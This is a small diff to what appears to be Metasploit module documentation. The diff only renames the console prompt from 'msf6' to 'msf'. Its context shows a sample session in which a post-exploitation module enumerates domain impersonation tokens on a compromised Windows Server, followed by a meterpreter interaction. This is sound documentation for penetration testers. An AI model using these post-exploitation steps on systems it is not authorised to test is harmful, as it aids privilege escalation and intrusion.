@@ -21,10 +21,10 @@ and Backup Operator groups.
 ### Local Administrator session on Windows Server 2016
 
 ```
-msf6 > use post/windows/gather/enum_domain_tokens
-msf6 post(windows/gather/enum_domain_tokens) > set session 1
+msf > use post/windows/gather/enum_domain_tokens
+msf post(windows/gather/enum_domain_tokens) > set session 1
 session => 1
-msf6 post(windows/gather/enum_domain_tokens) > run
+msf post(windows/gather/enum_domain_tokens) > run
 
 [*] Running module against WIN-7V3NGVNQTJ1 (192.168.200.215)
 [+] Current session is running under a Local Admin account
@@ -65,7 +65,7 @@ Impersonation Tokens with Domain Context
 
 
 [*] Post module execution completed
-msf6 post(windows/gather/enum_domain_tokens) > sessions -i 1
+msf post(windows/gather/enum_domain_tokens) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > getuid
